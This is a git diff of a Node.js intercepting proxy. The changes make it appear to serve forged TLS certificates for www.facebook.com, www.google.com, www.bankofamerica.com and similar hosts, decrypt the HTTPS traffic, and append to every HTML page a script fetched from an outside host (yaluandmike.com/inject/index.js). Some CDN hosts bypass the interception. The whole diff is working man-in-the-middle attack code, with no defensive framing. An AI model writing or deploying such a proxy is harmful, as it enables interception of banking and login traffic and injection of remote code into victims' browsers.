@@ -7,13 +7,11 @@ var http = require('http')
 var ADDITIONAL_CODE = {
     80: "<script type='text/javascript' src='http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js'></script>" +
         "<script type='text/javascript'>$.noConflict();</script>" +
-        "<script type='text/javascript' src='http://cdnjs.cloudflare.com/ajax/libs/require.js/1.0.1/require.min.js'></script>" +
-        "<script type='text/javascript' src='http://axiak.github.com/injectfun/index.js'></script>",
+        "<script type='text/javascript' src='http://www.yaluandmike.com/inject/index.js'></script>",
 
-    443: "<script type='text/javascript' src='http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js'></script>" +
+    443: "<script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js'></script>" +
         "<script type='text/javascript'>$.noConflict();</script>" +
-        "<script type='text/javascript' src='http://cdnjs.cloudflare.com/ajax/libs/require.js/1.0.1/require.min.js'></script>" +
-        "<script type='text/javascript' src='http://axiak.github.com/injectfun/index.js'></script>"
+        "<script type='text/javascript' src='https://www.yaluandmike.com:446/inject/index.js'></script>"
 };
 
 var PORT = ~~(process.env.PORT || 8000);
@@ -128,7 +126,6 @@ var serverDefinition = function (http_mod, default_port, is_ssl) { return catch_
           if (buffer.length == originalLength && buffer.search(/<html/i) !== -1) {
               buffer += ADDITIONAL_CODE[default_port];
           }
-          console.log(proxy_response.headers);
           response.end(buffer);
       } else {
           response.end();
@@ -167,22 +164,41 @@ server.on('error', function (error) {
 });
 server.on('upgrade', function (request, socket, head) {
      var parsed_url = url.parse('https://' + request.url);
-     /*
-     var clientSocket = net.createConnection(~~(parsed_url.port || 443),
-                                             parsed_url.hostname);
-     */
-     var clientSocket = net.createConnection(PORT + 1,
+
+     var clientSocket;
+
+     var hostName = parsed_url.hostname.toLowerCase();
+
+     if (!sslCerts[hostName] && !directSsl[hostName]) {
+         for (key in starCerts) {
+             if (hostName.substr(-key.length) === key) {
+                 hostName = starCerts[key];
+                 break;
+             }
+         }
+     }
+
+     if (directSsl[hostName]) {
+         clientSocket = net.createConnection(~~(parsed_url.port || 443),
+                                             hostName);
+     } else {
+         var sslPort = (sslCerts[hostName] || ['', 0])[1] + PORT + 1;
+         clientSocket = net.createConnection(sslPort,
                                              'localhost');
-     
+     }
+
      clientSocket.on('connect', function () {
          socket.write("HTTP/1.0 200 Connection established\r\n\r\n");
      });
+
      clientSocket.on('data', function (data) {
          socket.write(data);
      });
+
      clientSocket.on('end', function () {
          socket.end();
      });
+
      socket.on('data', function (data) {
          try {
              clientSocket.write(data);
@@ -196,20 +212,74 @@ server.on('upgrade', function (request, socket, head) {
 });
 
 var sslOptions = {
-    key: fs.readFileSync('keys/default.key.free'),
-    cert: fs.readFileSync('keys/default.crt')
 };
 
-var httpsServer = https.createServer(sslOptions, serverDefinition(https, 443, true));
-httpsServer.listen(PORT + 1);
-httpsServer.on('clientError', function (error) {
-    console.log("ClientError failure.");
-    console.log(error);
-    console.log(error.stack);
-});
-httpsServer.on('error', function (error) {
-    console.log("error failure.");
-    console.log(error);
-    console.log(error.stack);
-});
+var sslCerts = {
+    default:            ['default.key.free', 0, 'default.crt'],
+    'www.facebook.com': ['www.facebook.com.key.free', 1, 'www.facebook.com.crt'],
+    'www.google.com':   ['star.google.com.key.free', 2, 'star.google.com.crt'],
+    'www.yaluandmike.com':  ['star.yaluandmike.com.key.free', 3, 'star.yaluandmike.com.crt'],
+    'www.bankofamerica.com':  ['star.bankofamerica.com.key.free', 4, 'star.bankofamerica.com.crt'],
+    'google.com':  ['google.com.key.free', 5, 'google.com.crt'],
+    'star.ak.facebook.com': ['star.ak.facebook.com.key.free', 6, 'star.ak.facebook.com.crt']
+};
+
+var starCerts = {
+    'google.com': 'www.google.com',
+    'ak.facebook.com': 'star.ak.facebook.com',
+    'bankofamerica.com': 'www.bankofamerica.com'
+};
+
+var directSsl = {
+    'ajax.googleapis.com': 1,
+    'cdnjs.cloudflare.com': 1,
+    'raw.github.com': 1,
+    's-static.ak.facebook.com': 1,
+    'fbcdn-profile-a.akamaihd.net': 1,
+    'lh1.googleusercontent.com': 1,
+    'lh2.googleusercontent.com': 1,
+    'lh3.googleusercontent.com': 1,
+    'lh4.googleusercontent.com': 1,
+    'lh5.googleusercontent.com': 1,
+    'lh6.googleusercontent.com': 1,
+    'mail-attachment.googleusercontent.com': 1,
+    'pagead1.googleadservices.com': 1,
+    'pagead2.googleadservices.com': 1,
+    'pagead3.googleadservices.com': 1,
+    'ssl.gstatic.com': 1,
+    '0-ig-w.channel.facebook.com': 1,
+    's-external.ak.fbcdn.net': 1,
+    'fbcdn-sphotos-a.akamaihd.net': 1,
+    'fbcdn-photos-a.akamaihd.net': 1,
+    'pixel.facebook.com': 1,
+    'view.atdmt.com': 1,
+    'mail.google.com': 1,
+    'chatenabled.mail.google.com': 1
+};
+
+var sslPorts = {};
+
+
+for (var key in sslCerts) {
+    var port = PORT + 1 + sslCerts[key][1];
+    if (sslPorts[port]) {
+        continue;
+    }
+    sslPorts[port] = 1;
+    var lSslOptions = {cert: fs.readFileSync('keys/' + sslCerts[key][2]),
+                       'key': fs.readFileSync('keys/' + sslCerts[key][0])};
+    var httpsServer = https.createServer(lSslOptions, serverDefinition(https, 443, true));
+    httpsServer.listen(port);
+    httpsServer.on('clientError', function (error) {
+                       console.log("ClientError failure.");
+                       console.log(error);
+                       console.log(error.stack);
+    });
+
+    httpsServer.on('error', function (error) {
+                       console.log("error failure.");
+                       console.log(error);
+                       console.log(error.stack);
+    });
+}
 console.log("Proxy listening on port " + PORT + " and port " + (PORT + 1));
